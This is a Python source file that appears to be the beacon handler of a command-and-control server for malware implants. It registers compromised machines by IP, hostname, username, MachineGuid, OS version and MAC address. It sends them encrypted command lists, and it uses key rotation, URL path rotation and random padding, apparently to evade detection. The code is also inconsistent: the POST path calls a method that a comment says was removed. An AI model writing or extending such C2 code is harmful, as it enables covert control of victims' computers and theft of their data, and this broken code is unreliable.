import logging
import json
import base64
import re
import uuid
import hashlib
import random
import string
import urllib.parse
import datetime

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        try:
            # Check if we have a decrypted payload from the operation router
            if hasattr(self.request_handler, 'decrypted_payload'):
                # Use the payload directly
                decrypted_data = self.request_handler.decrypted_payload
                
                # Extract client_id if sent
                client_id = None
                if hasattr(self.request_handler, 'client_id'):
                    client_id = self.request_handler.client_id
                
                # Convert string to dict if needed
                if isinstance(decrypted_data, str):
                    try:
                        decrypted_data = json.loads(decrypted_data)
                    except json.JSONDecodeError:
                        # If it can't be parsed as JSON, wrap it in a simple dict
                        decrypted_data = {"raw_data": decrypted_data}
                
                # Process beacon with system info
                self._process_beacon_with_system_info(client_id, decrypted_data, include_rotation_info)
            else:
                # Handle as legacy beacon
                method = self.request_handler.command
                
                if method == "GET":
                    self._handle_get_beacon(include_rotation_info)
                else:  # POST
                    self._handle_post_beacon(include_rotation_info)
        except Exception as e:
            logger.error(f"Error handling beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_get_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via GET request"""
        try:
            # Parse the query string for data and token
            query_string = self.request_handler.path.split('?', 1)[1] if '?' in self.request_handler.path else ''
            query_params = {}
            
            if query_string:
                for param in query_string.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        query_params[key] = urllib.parse.unquote(value)
            
            encrypted_data = query_params.get('d')  # Shortened from 'data'
            token = query_params.get('t', '')       # Shortened from 'token'
            is_first_contact = query_params.get('i', 'false').lower() == 'true'  # Shortened from 'init'
            client_id = query_params.get('c')       # Shortened from 'client_id'
            
            if token:
                self.log_message(f"Received GET beacon with {len(token)} bytes of token padding")
            
            if not encrypted_data:
                self.send_error_response(400, "Missing data parameter")
                return
            
            # Process the request payload directly since _process_beacon_data is removed
            try:
                # Try to decrypt the data if possible
                decrypted_data = None
                if client_id:
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                    except Exception as e:
                        self.log_message(f"Failed to decrypt with client ID: {e}")
                
                if not decrypted_data:
                    # Try with campaign key if client key doesn't work
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data)
                    except Exception as e:
                        # For first contact, data might not be encrypted
                        if is_first_contact:
                            decrypted_data = encrypted_data
                        else:
                            self.log_message(f"Failed to decrypt data: {e}")
                            self.send_error_response(400, "Decryption failed")
                            return
                
                # Parse decrypted data
                try:
                    if isinstance(decrypted_data, str):
                        # Try to parse as JSON
                        try:
                            payload = json.loads(decrypted_data)
                        except json.JSONDecodeError:
                            # Not JSON, use as-is
                            payload = decrypted_data
                    else:
                        payload = decrypted_data
                    
                    # Extracting system_info from payload
                    system_info = None
                    if isinstance(payload, dict) and 'op_type' in payload and payload['op_type'] == 'beacon':
                        # Modern structure
                        system_info = payload.get('payload', {})
                        # If payload is a string, parse it
                        if isinstance(system_info, str):
                            try:
                                system_info = json.loads(system_info)
                            except:
                                pass
                    else:
                        # Old structure or direct system info
                        system_info = payload
                    
                    # Process beacon with system info
                    self._process_beacon_with_system_info(client_id, system_info, include_rotation_info)
                    
                except Exception as e:
                    self.log_message(f"Error processing beacon payload: {e}")
                    self.send_error_response(500, "Error processing beacon")
                    
            except Exception as e:
                self.log_message(f"Error handling beacon data: {e}")
                self.send_error_response(500, "Server error")
        except Exception as e:
            self.log_message(f"Error handling GET beacon: {e}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_post_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via POST request"""
        try:
            # Read content data
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error_response(400, "Missing content")
                return
                
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            # Parse the JSON body
            try:
                body_data = json.loads(request_body)
                encrypted_data = body_data.get('d')    # Shortened from 'data'
                
                # Extract token padding (we just need to log it)
                token = body_data.get('t', '')         # Shortened from 'token'
                is_first_contact = body_data.get('f', False)  # Shortened from 'first_contact'
                client_id = body_data.get('c')         # Shortened from 'client_id'
                
                if token:
                    self.log_message(f"Received POST beacon with {len(token)} bytes of token padding")
                
                if not encrypted_data:
                    self.send_error_response(400, "Missing data field")
                    return
                
                # Process the beacon data - same for both GET and POST
                self._process_beacon_data(encrypted_data, token, include_rotation_info, body_data, client_id=client_id, is_first_contact=is_first_contact)
                
            except json.JSONDecodeError:
                self.send_error_response(400, "Invalid JSON format")
                return
                
        except Exception as e:
            logger.error(f"Error handling POST beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _process_beacon_with_system_info(self, client_id, system_info, include_rotation_info=False):
        """
        Process beacon with system info directly from operation router
        
        Args:
            client_id: Client ID if available
            system_info: System information dictionary
            include_rotation_info: Whether to include rotation info in response
        """
        # Handle string system info by converting to dict
        if isinstance(system_info, str):
            try:
                system_info = json.loads(system_info)
            except json.JSONDecodeError:
                # If we can't decode it, create a minimal dict
                system_info = {"raw_data": system_info}
        
        # Identify client using system info
        if not client_id:
            # Try to generate client ID from system info if possible
            if isinstance(system_info, dict) and 'MachineGuid' in system_info:
                machine_guid = system_info['MachineGuid']
                client_id = hashlib.sha256(machine_guid.encode()).hexdigest()[:16]
            else:
                # Generate a new random client ID
                client_id = self._generate_client_id()
                self.log_message(f"Generated new client ID: {client_id}")
        
        # Check if client already exists
        is_new_client = client_id not in self.client_manager.get_clients_info()
        
        # Register or update client info
        self.client_manager.add_client(
            ip=self.client_address[0],
            hostname=system_info.get('Hostname', 'Unknown'),
            username=system_info.get('Username', 'Unknown'),
            machine_guid=system_info.get('MachineGuid', 'Unknown'),
            os_version=system_info.get('OsVersion', 'Unknown'),
            mac_address=system_info.get('MacAddress', 'Unknown'),
            system_info=system_info,
            client_id=client_id
        )
        
        # Verify client identity
        is_verified, confidence, needs_key_rotation, warnings = self.client_helper.verify_client(client_id, system_info)
        
        # Get commands for the client
        commands, has_key_operation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation,
            first_contact=is_new_client
        )
        
        # Add path rotation information if requested
        if include_rotation_info:
            rotation_info = self.path_router.get_rotation_info()
            rotation_command = self.path_router.create_path_rotation_command()
            commands.append(rotation_command)
        
        # Prepare response with commands and rotation info
        response_data = {
            "com": commands,           # Shortened from "commands"
            "f": is_new_client,        # Shortened from "first_contact"
            "e": False                 # Shortened from "encrypted"
        }
        
        # Include client ID for first contact
        if is_new_client:
            response_data["c"] = client_id
        
        # Add key operation flags
        if has_key_operation:
            if is_new_client:
                response_data["ki"] = True  # Shortened from "key_issuance"
            else:
                response_data["kr"] = True  # Shortened from "key_rotation"
        
        # Add rotation info
        rotation_info = {
            "cid": self.path_router.path_manager.rotation_counter,       # Shortened from "current_rotation_id"
            "nrt": self.path_router.path_manager.get_next_rotation_time() # Shortened from "next_rotation_time"
        }
        response_data["r"] = rotation_info
        
        # For established clients with encryption, encrypt the commands
        if not is_new_client and commands:
            # Convert commands to JSON string for encryption
            commands_json = json.dumps(commands)
            
            # Encrypt the commands
            encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
            
            # Replace commands with encrypted version
            response_data["com"] = encrypted_commands
            response_data["e"] = True
        
        # Add random padding to the response
        response_data["t"] = self._generate_token_padding()
        
        # Send the response as JSON
        self.send_response(200, "application/json", json.dumps(response_data))
    
    # The rest of the BeaconHandler methods remain largely the same,
    # just updating references from dedicated paths to use random paths